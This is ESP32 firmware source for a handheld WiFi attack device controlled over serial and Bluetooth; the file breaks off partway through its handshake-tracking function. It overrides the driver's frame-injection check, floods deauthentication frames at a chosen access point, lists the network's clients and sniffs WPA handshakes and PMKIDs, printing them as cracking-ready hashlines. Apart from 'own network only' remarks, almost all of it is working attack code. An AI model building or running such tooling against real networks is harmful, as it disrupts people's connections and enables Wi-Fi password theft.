#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <NimBLEDevice.h>
#include <freertos/queue.h>

// ---------------------------------------------------------------------------
// Deauth injection unlock.
// On esp32 core 3.x the WiFi lib rejects raw deauth/disassoc frames via a weak
// symbol sanity check. Overriding it (return 0 = "frame is fine") re-enables
// esp_wifi_80211_tx() for management frames. Standard esp32-deauther trick.
// ---------------------------------------------------------------------------
// Re-enables raw mgmt-frame (deauth) injection. On esp32 core 3.3.11 this symbol is
// a NON-weak global in libnet80211.a, and the WiFi lib calls it from within its own
// object -- so it must be *replaced* (via -Wl,--allow-multiple-definition, see
// build.sh), not --wrap'd. Our definition (linked first) wins for every reference.
// ok??? 

extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
  return 0;
}

// ---------------------- Display wiring (your confirmed pins) ----------------
#define TFT_SCLK 18
#define TFT_MOSI 23
#define TFT_CS   21
#define TFT_DC   22
#define TFT_RST  32
Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_MOSI, TFT_SCLK, TFT_RST);

#define C_BG    ST77XX_BLACK
#define C_TXT   ST77XX_WHITE
#define C_HDR   ST77XX_CYAN
#define C_OK    ST77XX_GREEN
#define C_WARN  ST77XX_YELLOW
#define C_ALERT ST77XX_RED

enum Mode { MODE_IDLE, MODE_DEAUTH, MODE_SNIFF, MODE_CAPTURE, MODE_STATIONS };
volatile Mode mode = MODE_IDLE;

// pulse and wait long enough for framesss
const uint32_t PULSE_PERIOD = 5000;   // ms between deauth bursts
const int      PULSE_FRAMES = 32;     // deauth frames per burst
const uint32_t SNIFF_HOP_PERIOD = 350; // ms per channel when sniffing without target
uint32_t lastPulse   = 0;
bool     captureGotIt = false;        // stop pulsing once we've grabbed a handshak <-- statecheck
uint8_t  sniffChannel = 1;
uint32_t lastHop      = 0;

struct APInfo {
  String  ssid;
  uint8_t bssid[6];
  int32_t channel;
  int32_t rssi;
  uint8_t enc;
};
#define MAX_AP 60
APInfo aps[MAX_AP];
int    apCount  = 0;
int    selected = -1;

// deauth stats
uint32_t deauthSent = 0;

// --- passive client (station) discovery -------------------------------------
// Built from data frames in promiscuous mode: which STA MACs talk to the target
// BSSID. MAC-layer addresses are NOT encrypted, so this works even on WPA nets.
// (We cannot see the internet endpoint a client reaches -- that payload is
// encrypted -- only the client<->AP association.)
// vibecoded les go
#define MAX_STA 32
struct Station { uint8_t mac[6]; uint32_t packets; int8_t rssi; };
Station        stations[MAX_STA];
int            staCount = 0;
portMUX_TYPE   staMux = portMUX_INITIALIZER_UNLOCKED;   // WiFi task <-> loop guard
uint32_t       staStart = 0;
const uint32_t STATIONS_DURATION = 8000;  // ms to listen for clients

volatile uint32_t eapolCount = 0;
#define MAX_EAPOL_FRAME 512
struct Capture {
  bool     hasPmkid;
  bool     completePair;
  uint8_t  pmkid[16];
  uint8_t  apMac[6];
  uint8_t  staMac[6];
  int      msgNum;       // 1..4 from EAPOL key-info flags, 0 if unknown
  uint16_t keyInfo;
  uint8_t  replay[8];
  uint8_t  nonce[32];
  uint8_t  mic[16];
  uint16_t eapolLen;     // copied EAPOL header + body length
  uint8_t  eapol[MAX_EAPOL_FRAME];
} cap;
QueueHandle_t capQueue = nullptr;

// Explicit prototypes keep Arduino's sketch preprocessor from generating these
// before the Capture type declaration.
static String pmkidHashline(const Capture& ev);
static bool updateHandshakeAndBuildHash(Capture& ev, String& hashline);

struct HandshakeTracker {
  bool     active;
  bool     hasM1;
  uint8_t  apMac[6];
  uint8_t  staMac[6];
  uint8_t  m1Replay[8];
  uint8_t  anonce[32];
  uint8_t  m2Mic[16];
  uint16_t m2EapolLen;
  uint8_t  m2Eapol[MAX_EAPOL_FRAME];
} hs;

bool screenDirty = true;
uint32_t lastRefresh = 0;
bool captureBannerShown = false;
bool captureBannerHasPmkid = false;

// deauth frame template (24-byte mgmt header + 2-byte reason = 26)
uint8_t deauthPkt[26] = {
  0xC0, 0x00,                         // frame control: subtype=deauth
  0x00, 0x00,                         // duration
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,      // addr1 = dest  (broadcast)
  0x00,0x00,0x00,0x00,0x00,0x00,      // addr2 = source (AP BSSID)
  0x00,0x00,0x00,0x00,0x00,0x00,      // addr3 = BSSID
  0x00, 0x00,                         // seq
  0x07, 0x00                          // reason 7 = class-3 frame from nonassoc STA
};

// ======================= BLE control channel (NimBLE / NUS) =================
// Nordic UART Service: the phone WRITES commands to RX, the board NOTIFIES output
// on TX. Output is mirrored live to USB Serial + the 1.8" display, but the app only
// receives a *batch* when an operation finishes (buffer-and-flush) -> the BLE link
// barely contends with the WiFi sniff/deauth. Incoming commands are handed to loop()
// via a queue so WiFi/display code never runs inside the BLE host task.
// vibecoded as well i dont know how to do ble --__(*-*)__--
#define NUS_SVC "6E400001-B5A3-F393-E0A9-E50E24DCCA9E"
#define NUS_RX  "6E400002-B5A3-F393-E0A9-E50E24DCCA9E"   // app  -> board (commands)
#define NUS_TX  "6E400003-B5A3-F393-E0A9-E50E24DCCA9E"   // board -> app  (output)

NimBLECharacteristic* txChar       = nullptr;
volatile bool         bleConnected = false;
volatile uint16_t     bleMtu       = 23;      // updated on MTU negotiation
String                bleOut;                 // pending app output (flushed at boundary)
String                bleCmdBuf;              // incoming line assembly (BLE task only)
QueueHandle_t         cmdQueue     = nullptr; // BLE task -> loop() command handoff
const size_t          BLE_BUF_MAX  = 8192;   // hold a full 60-AP scan without front-trimming

// ---- output: live to USB Serial (display handled separately), buffered for app ----
static void bleTrim() {
  if (bleOut.length() > BLE_BUF_MAX) bleOut.remove(0, bleOut.length() - BLE_BUF_MAX);
}
void outln(const char* s)                { Serial.println(s); if (bleConnected) { bleOut += s; bleOut += '\n'; bleTrim(); } }
void outln(const __FlashStringHelper* s) { Serial.println(s); if (bleConnected) { bleOut += s; bleOut += '\n'; bleTrim(); } }
void outf(const char* fmt, ...) {
  char b[256];
  va_list ap; va_start(ap, fmt); vsnprintf(b, sizeof(b), fmt, ap); va_end(ap);
  Serial.print(b);
  if (bleConnected) { bleOut += b; bleTrim(); }
}
void outstr(const String& s) {
  Serial.print(s);
  if (bleConnected) { bleOut += s; bleTrim(); }
}

// push the accumulated buffer to the app in MTU-sized notifies, then clear it
void bleFlush() {
  if (!bleConnected || !txChar || bleOut.length() == 0) return;
  int chunk = bleMtu > 23 ? bleMtu - 3 : 20;
  int n = bleOut.length();
  for (int i = 0; i < n; i += chunk) {
    int end = i + chunk; if (end > n) end = n;
    String part = bleOut.substring(i, end);
    txChar->setValue((const uint8_t*)part.c_str(), part.length());
    txChar->notify();
    delay(15);                       // pace notifies so the phone doesn't drop them
  }
  bleOut = "";
}

class ServerCB : public NimBLEServerCallbacks {
  void onConnect(NimBLEServer* s, NimBLEConnInfo& info) override {
    bleConnected = true; bleOut = "";
    // request a relaxed 30-50ms interval -> keeps BLE's radio share ~2-5%
    s->updateConnParams(info.getConnHandle(), 24, 40, 0, 400);
    Serial.println("[ble] app connected");
  }
  void onDisconnect(NimBLEServer* s, NimBLEConnInfo& info, int reason) override {
    bleConnected = false; bleOut = "";
    Serial.println("[ble] app disconnected");
    NimBLEDevice::startAdvertising();
  }
  void onMTUChange(uint16_t mtu, NimBLEConnInfo& info) override { bleMtu = mtu; }
};

class RxCB : public NimBLECharacteristicCallbacks {
  void onWrite(NimBLECharacteristic* c, NimBLEConnInfo& info) override {
    std::string v = c->getValue();          // command bytes from the app
    for (size_t i = 0; i < v.size(); i++) {
      char ch = v[i];
      if (ch == '\n' || ch == '\r') {
        if (bleCmdBuf.length()) {
          char line[97];
          strncpy(line, bleCmdBuf.c_str(), sizeof(line) - 1);
          line[sizeof(line) - 1] = 0;
          if (cmdQueue) xQueueSend(cmdQueue, line, 0);   // dispatch in loop() context
          bleCmdBuf = "";
        }
      } else if (bleCmdBuf.length() < 95) {
        bleCmdBuf += ch;
      }
    }
  }
};

void bleInit() {
  cmdQueue = xQueueCreate(4, 97);
  if (!NimBLEDevice::init("T-A7670E-CLI")) { Serial.println("[ble] init FAILED"); return; }
  NimBLEDevice::setMTU(247);
  NimBLEServer* srv = NimBLEDevice::createServer();
  srv->setCallbacks(new ServerCB());
  NimBLEService* svc = srv->createService(NUS_SVC);
  NimBLECharacteristic* rx = svc->createCharacteristic(
      NUS_RX, NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::WRITE_NR);
  rx->setCallbacks(new RxCB());
  txChar = svc->createCharacteristic(NUS_TX, NIMBLE_PROPERTY::NOTIFY);
  svc->start();
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  // ORDER MATTERS: enable scan-response FIRST. NimBLE's setName() only routes the
  // name into the scan-response packet if scan-response is already enabled; otherwise
  // it's forced into the main adv packet, which then overflows past 31 bytes alongside
  // the 128-bit service UUID and advertising fails. adv = flags+UUID, scanRsp = name.
  adv->enableScanResponse(true);
  adv->addServiceUUID(NUS_SVC);
  adv->setName("T-A7670E-CLI");
  bool ok = NimBLEDevice::startAdvertising();
  Serial.printf("[ble] init ok, advertising %s as 'T-A7670E-CLI' (NUS)\n",
                ok ? "STARTED" : "FAILED");
}

// ----------------------------- helpers --------------------------------------
static void macToStr(const uint8_t* m, char* out) {
  sprintf(out, "%02X:%02X:%02X:%02X:%02X:%02X", m[0],m[1],m[2],m[3],m[4],m[5]);
}
static void macToHex(const uint8_t* m, char* out) {
  sprintf(out, "%02X%02X%02X%02X%02X%02X", m[0],m[1],m[2],m[3],m[4],m[5]);
}
static uint16_t be16(const uint8_t* p) {
  return ((uint16_t)p[0] << 8) | p[1];
}
static bool sameMac(const uint8_t* a, const uint8_t* b) {
  return memcmp(a, b, 6) == 0;
}
static bool sameReplay(const uint8_t* a, const uint8_t* b) {
  return memcmp(a, b, 8) == 0;
}
static String bytesHex(const uint8_t* data, size_t len) {
  String s;
  s.reserve(len * 2);
  char b[3];
  for (size_t i = 0; i < len; i++) {
    sprintf(b, "%02X", data[i]);
    s += b;
  }
  return s;
}
static String selectedEssidHexFor(const uint8_t* apMac) {
  if (selected < 0 || !sameMac(apMac, aps[selected].bssid)) return String("");
  String s;
  String essid = aps[selected].ssid;
  s.reserve(essid.length() * 2);
  char b[3];
  for (size_t i = 0; i < essid.length(); i++) {
    sprintf(b, "%02X", (uint8_t)essid[i]);
    s += b;
  }
  return s;
}
static void resetHandshake() {
  memset(&hs, 0, sizeof(hs));
}
static void recordStation(const uint8_t* mac, int8_t rssi) {
  if (mac[0] & 0x01) return;                 // group/broadcast bit -> not a client
  portENTER_CRITICAL(&staMux);
  for (int i = 0; i < staCount; i++) {
    if (sameMac(stations[i].mac, mac)) {
      stations[i].packets++;
      stations[i].rssi = rssi;
      portEXIT_CRITICAL(&staMux);
      return;
    }
  }
  if (staCount < MAX_STA) {
    memcpy(stations[staCount].mac, mac, 6);
    stations[staCount].packets = 1;
    stations[staCount].rssi = rssi;
    staCount++;
  }
  portEXIT_CRITICAL(&staMux);
}
static const char* encStr(uint8_t e) {
  switch (e) {
    case WIFI_AUTH_OPEN:            return "OPEN";
    case WIFI_AUTH_WEP:             return "WEP";
    case WIFI_AUTH_WPA_PSK:         return "WPA";
    case WIFI_AUTH_WPA2_PSK:        return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/2";
    case WIFI_AUTH_WPA3_PSK:        return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/3";
    default:                        return "?";
  }
}

// ------------------------------ display -------------------------------------
void drawHeader(const char* modeName, uint16_t modeColor) {
  tft.fillRect(0, 0, 160, 10, C_BG);
  tft.setCursor(0, 1);
  tft.setTextColor(C_HDR);
  tft.setTextSize(1);
  tft.print("T-A7670E CLI ");
  tft.setTextColor(modeColor);
  tft.print(modeName);
  tft.drawFastHLine(0, 10, 160, C_HDR);
}

void drawScanScreen() {
  tft.fillScreen(C_BG);
  drawHeader("SCAN", C_OK);
  tft.setTextSize(1);
  int y = 14;
  int shown = apCount < 13 ? apCount : 13;
  for (int i = 0; i < shown; i++) {
    tft.setCursor(0, y);
    tft.setTextColor(i == selected ? C_WARN : C_TXT);
    char line[32];
    String s = aps[i].ssid.length() ? aps[i].ssid : String("<hidden>");
    if (s.length() > 12) s = s.substring(0, 12);
    snprintf(line, sizeof(line), "%2d %-12s c%2ld %ld",
             i, s.c_str(), (long)aps[i].channel, (long)aps[i].rssi);
    tft.print(line);
    y += 9;
  }
  screenDirty = false;
}

void drawIdleScreen() {
  tft.fillScreen(C_BG);
  drawHeader("READY", C_OK);
  tft.setTextSize(1);
  tft.setTextColor(C_TXT);
  tft.setCursor(0, 20); tft.print("Waiting for command");
  tft.setCursor(0, 32); tft.setTextColor(C_HDR); tft.print("BLE: T-A7670E-CLI");
  screenDirty = false;
}

void drawDeauthScreen() {
  tft.fillScreen(C_BG);
  drawHeader("DEAUTH", C_ALERT);
  tft.setTextSize(1);
  tft.setTextColor(C_TXT);
  char mac[18];
  macToStr(aps[selected].bssid, mac);
  tft.setCursor(0, 16); tft.print("Target:");
  tft.setCursor(0, 26); tft.setTextColor(C_WARN);
  String s = aps[selected].ssid.length() ? aps[selected].ssid : String("<hidden>");
  tft.print(s.substring(0, 24));
  tft.setCursor(0, 38); tft.setTextColor(C_TXT); tft.print(mac);
  tft.setCursor(0, 50); tft.print("Ch "); tft.print(aps[selected].channel);
  tft.setCursor(0, 66); tft.setTextColor(C_ALERT); tft.print("Flooding deauth...");
  screenDirty = false;
}

void drawSniffScreen() {
  tft.fillScreen(C_BG);
  drawHeader("SNIFF", C_WARN);
  tft.setTextSize(1);
  tft.setTextColor(C_TXT);
  tft.setCursor(0, 16);
  if (selected >= 0) { tft.print("Ch "); tft.print(aps[selected].channel);
                       tft.print(" listening EAPOL"); }
  else               { tft.print("Hopping, listening EAPOL"); }
  screenDirty = false;
}

void drawCaptureScreen() {
  tft.fillScreen(C_BG);
  drawHeader("CAPTURE", C_ALERT);
  tft.setTextSize(1);
  tft.setTextColor(C_WARN);
  String s = aps[selected].ssid.length() ? aps[selected].ssid : String("<hidden>");
  tft.setCursor(0, 16); tft.print(s.substring(0, 24));
  tft.setTextColor(C_TXT);
  tft.setCursor(0, 26); tft.print("Ch "); tft.print(aps[selected].channel);
  tft.print("  pulse+sniff");
  tft.setCursor(0, 36); tft.print("deauth -> wait rejoin");
  screenDirty = false;
}

// Big banner when a real handshake/PMKID lands.
void drawCaptureBanner() {
  tft.fillRect(0, 40, 160, 88, C_BG);
  tft.setTextSize(2);
  tft.setTextColor((cap.hasPmkid || cap.completePair) ? C_OK : C_WARN);
  tft.setCursor(0, 44);
  tft.print(cap.hasPmkid ? "HASH" : cap.completePair ? "PAIR" : "EAPOL");
  tft.setCursor(0, 62);
  if (cap.hasPmkid) tft.print("CAPTURED");
  else if (cap.completePair) tft.print("READY");
  else { tft.print("M"); tft.print(cap.msgNum); }

  tft.setTextSize(1);
  tft.setTextColor(C_TXT);
  char mac[18];
  macToStr(cap.apMac, mac);
  tft.setCursor(0, 84);  tft.print("AP "); tft.print(mac);
  if (cap.hasPmkid) {
    tft.setCursor(0, 96); tft.setTextColor(C_ALERT); tft.print("PMKID (WPA hash):");
    char hx[17];
    for (int i = 0; i < 8; i++) sprintf(hx + i*2, "%02X", cap.pmkid[i]);
    hx[16] = 0;
    tft.setCursor(0, 106); tft.setTextColor(C_OK); tft.print(hx);
    tft.setCursor(0, 116); tft.print("...(full over serial)");
  } else {
    tft.setCursor(0, 96);
    tft.print(cap.completePair ? "M1+M2 captured" : "handshake frame seen");
  }
}

// Feature 1: shown on the panel the moment a scan starts (before the ~2s block).
void drawScanningScreen() {
  tft.fillScreen(C_BG);
  drawHeader("SCAN", C_OK);
  tft.setTextSize(2);
  tft.setTextColor(C_WARN);
  tft.setCursor(0, 48); tft.print("SCANNING");
  tft.setTextSize(1);
  tft.setTextColor(C_TXT);
  tft.setCursor(0, 74); tft.print("2.4GHz APs...");
  screenDirty = true;   // force a repaint back to the AP list when results land
}

// Feature 2: client-discovery screen.
void drawStationsScreen() {
  tft.fillScreen(C_BG);
  drawHeader("CLIENTS", C_HDR);
  tft.setTextSize(1);
  String s = aps[selected].ssid.length() ? aps[selected].ssid : String("<hidden>");
  tft.setCursor(0, 16); tft.setTextColor(C_WARN); tft.print(s.substring(0, 24));
  tft.setTextColor(C_TXT);
  tft.setCursor(0, 26); tft.print("Ch "); tft.print(aps[selected].channel);
  tft.print("  finding clients");
  screenDirty = false;
}

void drawCurrentScreen() {
  if (!screenDirty) return;
  if      (mode == MODE_DEAUTH)   drawDeauthScreen();
  else if (mode == MODE_SNIFF)    drawSniffScreen();
  else if (mode == MODE_CAPTURE)  drawCaptureScreen();
  else if (mode == MODE_STATIONS) drawStationsScreen();
  else if (apCount > 0)           drawScanScreen();
  else                             drawIdleScreen();
}

void snifferCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA || !capQueue) return;
  const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* pl = p->payload;
  int len = p->rx_ctrl.sig_len;
  if (len < 40) return;
  if (len > 1600) len = 1600;   // clamp parse window; EAPOL frames are small

  uint8_t fc0 = pl[0];
  uint8_t fc1 = pl[1];
  if ((fc0 & 0x0C) != 0x08) return;      // data frame only

  bool toDS   = fc1 & 0x01;
  bool fromDS = fc1 & 0x02;
  if (toDS == fromDS) return;             // ignore IBSS/WDS; this lab targets AP<->STA

  // ---- client discovery: any data frame to/from the target AP names a client ----
  // Addresses live at fixed offsets (4=RA, 10=TA); no need for the EAPOL length yet.
  {
    const uint8_t* ra = pl + 4;
    const uint8_t* ta = pl + 10;
    const uint8_t* apM  = fromDS ? ta : ra;
    const uint8_t* staM = fromDS ? ra : ta;
    if (selected >= 0 && sameMac(apM, aps[selected].bssid))
      recordStation(staM, p->rx_ctrl.rssi);
  }

  uint8_t subtype = (fc0 & 0xF0) >> 4;
  bool qos = subtype & 0x08;
  int hdr = 24;
  if (qos) hdr += 2;
  if (qos && (fc1 & 0x80)) hdr += 4;      // optional HT-control after QoS control
  if (len < hdr + 8 + 99) return;

  // LLC/SNAP header carrying EAPOL ethertype 0x888E?
  if (!(pl[hdr] == 0xAA && pl[hdr+1] == 0xAA && pl[hdr+2] == 0x03 &&
        pl[hdr+6] == 0x88 && pl[hdr+7] == 0x8E)) return;

  const uint8_t* a1 = pl + 4;             // receiver / destination
  const uint8_t* a2 = pl + 10;            // transmitter / source
  const uint8_t* apMac  = fromDS ? a2 : a1;
  const uint8_t* staMac = fromDS ? a1 : a2;

  if (selected >= 0 && !sameMac(apMac, aps[selected].bssid)) return;

  int eo = hdr + 8;                       // EAPOL header start
  if (pl[eo + 1] != 0x03) return;         // EAPOL-Key
  uint16_t eapolBodyLen = be16(pl + eo + 2);
  uint16_t eapolLen = eapolBodyLen + 4;
  if (eapolBodyLen < 95 || eapolLen > MAX_EAPOL_FRAME) return;
  if (len < eo + eapolLen) return;

  Capture ev;
  memset(&ev, 0, sizeof(ev));
  memcpy(ev.apMac, apMac, 6);
  memcpy(ev.staMac, staMac, 6);
  ev.eapolLen = eapolLen;
  memcpy(ev.eapol, pl + eo, eapolLen);
  ev.keyInfo = be16(pl + eo + 5);
  memcpy(ev.replay, pl + eo + 9, 8);
  memcpy(ev.nonce,  pl + eo + 17, 32);
  memcpy(ev.mic,    pl + eo + 81, 16);

  bool ack     = ev.keyInfo & 0x0080;
  bool mic     = ev.keyInfo & 0x0100;
  bool install = ev.keyInfo & 0x0040;
  bool secure  = ev.keyInfo & 0x0200;
  if      ( ack && !mic)                ev.msgNum = 1;
  else if (!ack &&  mic && !secure)     ev.msgNum = 2;
  else if ( ack &&  mic && install)     ev.msgNum = 3;
  else if (!ack &&  mic &&  secure)     ev.msgNum = 4;
  else                                  ev.msgNum = 0;

  // PMKID KDE is a vendor-specific element: DD 14 00 0F AC 04 <16-byte PMKID>.
  uint16_t keyDataLen = be16(pl + eo + 97);
  int kd = eo + 99;
  int kdEnd = kd + keyDataLen;
  if (kdEnd <= eo + eapolLen && kdEnd <= len) {
    for (int i = kd; i + 2 <= kdEnd; ) {
      uint8_t id = pl[i];
      uint8_t elen = pl[i + 1];
      if (i + 2 + elen > kdEnd) break;
      if (id == 0xDD && elen >= 20 &&
          pl[i+2] == 0x00 && pl[i+3] == 0x0F &&
          pl[i+4] == 0xAC && pl[i+5] == 0x04) {
        bool nonzero = false;
        for (int k = 0; k < 16; k++) {
          ev.pmkid[k] = pl[i + 6 + k];
          if (ev.pmkid[k]) nonzero = true;
        }
        ev.hasPmkid = nonzero;
        break;
      }
      i += 2 + elen;
    }
  }

  eapolCount++;
  xQueueSend(capQueue, &ev, 0);
}

// ------------------------------ radio control -------------------------------
void radioIdle() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  if (capQueue) xQueueReset(capQueue);
  resetHandshake();
  captureGotIt = false;
  mode = MODE_IDLE;
}

void startDeauth() {
  if (selected < 0) { outln("[!] select <n> first"); return; }
  esp_wifi_set_promiscuous(false);
  // point source/bssid at target, lock channel
  memcpy(deauthPkt + 10, aps[selected].bssid, 6);
  memcpy(deauthPkt + 16, aps[selected].bssid, 6);
  esp_wifi_set_channel(aps[selected].channel, WIFI_SECOND_CHAN_NONE);
  deauthSent = 0;
  mode = MODE_DEAUTH;
  screenDirty = true;
  char mac[18]; macToStr(aps[selected].bssid, mac);
  outf("[deauth] target %s ch%ld ssid=%s\n",
                mac, (long)aps[selected].channel, aps[selected].ssid.c_str());
  outln("[deauth] broadcasting reason-7 frames. 'stop' to end.");
}

void startSniff() {
  eapolCount = 0;
  if (capQueue) xQueueReset(capQueue);
  resetHandshake();
  captureBannerShown = false; captureBannerHasPmkid = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&snifferCB);
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;   // EAPOL data frames
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous(true);
  if (selected >= 0) {
    esp_wifi_set_channel(aps[selected].channel, WIFI_SECOND_CHAN_NONE);
  } else {
    sniffChannel = 1;
    lastHop = millis();
    esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
  }
  mode = MODE_SNIFF;
  screenDirty = true;
  outln("[sniff] promiscuous EAPOL capture on. Deauth a client to force a rejoin.");
  if (selected < 0) outln("[sniff] no target selected -> hopping channels 1..13");
}

void startCapture() {
  if (selected < 0) { outln("[!] select <n> first (capture needs a fixed channel)"); return; }
  eapolCount = 0; captureGotIt = false;
  if (capQueue) xQueueReset(capQueue);
  resetHandshake();
  captureBannerShown = false; captureBannerHasPmkid = false;
  memcpy(deauthPkt + 10, aps[selected].bssid, 6);   // source = AP
  memcpy(deauthPkt + 16, aps[selected].bssid, 6);   // bssid  = AP
  
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&snifferCB);
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(aps[selected].channel, WIFI_SECOND_CHAN_NONE);
  deauthSent = 0;
  lastPulse  = millis() - PULSE_PERIOD;   // fire the first pulse immediately
  mode = MODE_CAPTURE;
  screenDirty = true;
  outf("[capture] target %s ch%ld -> pulse deauth every %ds, sniff EAPOL.\n",
                aps[selected].ssid.c_str(), (long)aps[selected].channel,
                (int)(PULSE_PERIOD / 1000));
}

// Passive client discovery: listen on the target AP's channel and collect the
// STA MACs that exchange data frames with it. See recordStation() / snifferCB().
void startStations() {
  if (selected < 0) { outln("[!] select <n> first (clients needs a target AP)"); return; }
  portENTER_CRITICAL(&staMux); staCount = 0; portEXIT_CRITICAL(&staMux);
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&snifferCB);
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(aps[selected].channel, WIFI_SECOND_CHAN_NONE);
  staStart = millis();
  mode = MODE_STATIONS;
  screenDirty = true;
  char mac[18]; macToStr(aps[selected].bssid, mac);
  // marker flushed immediately by loop() so the phone shows "finding clients"
  outf("[STATIONS] start bssid=%s ch=%ld window=%ds\n",
       mac, (long)aps[selected].channel, (int)(STATIONS_DURATION / 1000));
}

void doScan() {
  radioIdle();
  outln("[SCAN] start");
  outln("[scan] scanning 2.4GHz...");
  bleFlush();
  
  drawScanningScreen();
  int n = WiFi.scanNetworks(false, true, false, 300);
  apCount = n < MAX_AP ? n : MAX_AP;
  for (int i = 0; i < apCount; i++) {
    aps[i].ssid    = WiFi.SSID(i);
    memcpy(aps[i].bssid, WiFi.BSSID(i), 6);
    aps[i].channel = WiFi.channel(i);
    aps[i].rssi    = WiFi.RSSI(i);
    aps[i].enc     = WiFi.encryptionType(i);
  }
  WiFi.scanDelete();
  doList();
  outf("[SCAN] done %d\n", apCount);
  screenDirty = true;
  drawScanScreen();
}

void doList() {
  outf("[list] %d APs\n", apCount);
  outln(" idx  ch  rssi  enc     bssid              ssid");
  for (int i = 0; i < apCount; i++) {
    char mac[18]; macToStr(aps[i].bssid, mac);
    outf(" %s%2d  %2ld  %4ld  %-6s  %s  %s\n",
                  i == selected ? "*" : " ", i,
                  (long)aps[i].channel, (long)aps[i].rssi,
                  encStr(aps[i].enc), mac,
                  aps[i].ssid.length() ? aps[i].ssid.c_str() : "<hidden>");
  }
}

void doSelect(int n) {
  if (n < 0 || n >= apCount) { outln("[!] bad index"); return; }
  selected = n;
  char mac[18]; macToStr(aps[n].bssid, mac);
  outf("[select] %d -> %s (%s) ch%ld\n",
                n, aps[n].ssid.c_str(), mac, (long)aps[n].channel);
  screenDirty = true;
}

void doStatus() {
  const char* m = mode == MODE_DEAUTH   ? "DEAUTH"
                : mode == MODE_SNIFF    ? "SNIFF"
                : mode == MODE_CAPTURE  ? "CAPTURE"
                : mode == MODE_STATIONS ? "STATIONS" : "IDLE";
  outf("[status] mode=%s selected=%d aps=%d deauthSent=%lu eapol=%lu\n",
                m, selected, apCount, (unsigned long)deauthSent,
                (unsigned long)eapolCount);
}

void printHelp() {
  outln(F(
    "\n=== T-A7670E WiFi CLI ===\n"
    " help            this help\n"
    " scan            scan 2.4GHz APs\n"
    " list            reprint scan\n"
    " select <n>      pick target AP by index\n"
    " deauth          deauth selected AP's clients (own network only!)\n"
    " sniff           passive: capture EAPOL / PMKID (real WPA hash)\n"
    " capture         combined: pulse deauth + sniff = force+grab handshake\n"
    " stations        list clients talking to the selected AP (aka 'clients')\n"
    " stop            stop attack/sniff/capture\n"
    " status          show state\n"
    " clear           clear scan + capture\n"));
}

void handleCommand(String line) {
  line.trim();
  if (!line.length()) return;
  int sp = line.indexOf(' ');
  String cmd = sp < 0 ? line : line.substring(0, sp);
  String arg = sp < 0 ? ""   : line.substring(sp + 1);
  cmd.toLowerCase();

  if      (cmd == "help")   printHelp();
  else if (cmd == "scan")   doScan();
  else if (cmd == "list")   doList();
  else if (cmd == "select") doSelect(arg.toInt());
  else if (cmd == "deauth")  startDeauth();
  else if (cmd == "sniff")   startSniff();
  else if (cmd == "capture") startCapture();
  else if (cmd == "stations" || cmd == "clients") startStations();
  else if (cmd == "stop")   { radioIdle(); screenDirty = true; outln("[stop] idle"); }
  else if (cmd == "status") doStatus();
  else if (cmd == "clear")  { apCount = 0; selected = -1;
                              eapolCount = 0; captureGotIt = false;
                              if (capQueue) xQueueReset(capQueue);
                              resetHandshake();
                              captureBannerShown = false; captureBannerHasPmkid = false;
                              screenDirty = true; outln("[clear] done"); }
  else outf("[!] unknown: %s (try 'help')\n", cmd.c_str());
}

// ------------------------------- setup/loop ---------------------------------
void setup() {
  Serial.begin(115200);
  delay(200);

  tft.initR(INITR_BLACKTAB);
  tft.setRotation(3);              // 160x128 landscape, flipped 180 (case mounts panel upside-down)
  tft.fillScreen(C_BG);
  drawHeader("READY", C_OK);
  tft.setTextSize(1);
  tft.setTextColor(C_TXT);
  tft.setCursor(0, 20); tft.println("Serial CLI @115200");
  tft.setCursor(0, 32); tft.println("type 'help'");

  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  esp_wifi_set_ps(WIFI_PS_NONE);
  capQueue = xQueueCreate(8, sizeof(Capture));

  bleInit();                      
  tft.setCursor(0, 44); tft.setTextColor(C_HDR); tft.println("+ BLE: T-A7670E-CLI");

  printHelp();
  outln("[boot] ready. (own-network testing only)");
}

String cmdBuf;
uint32_t lastDeauthBurst = 0;

static String pmkidHashline(const Capture& ev) {
  char apHex[13], staHex[13];
  macToHex(ev.apMac, apHex);
  macToHex(ev.staMac, staHex);
  String line = "[CAPTURE] hashline: WPA*01*";
  line += bytesHex(ev.pmkid, 16);
  line += "*"; line += apHex;
  line += "*"; line += staHex;
  line += "*"; line += selectedEssidHexFor(ev.apMac);
  line += "***\n";
  return line;
}

static bool updateHandshakeAndBuildHash(Capture& ev, String& hashline) {
  if (ev.msgNum == 1) {
    if (!hs.active || !sameMac(hs.apMac, ev.apMac) || !sameMac(hs.staMac, ev.staMac)) {
      resetHandshake();
      hs.active = true;
      memcpy(hs.apMac, ev.apMac, 6);
      memcpy(hs.staMac, ev.staMac, 6);
    }
    hs.hasM1 = true;
    memcpy(hs.m1Replay, ev.replay, 8);
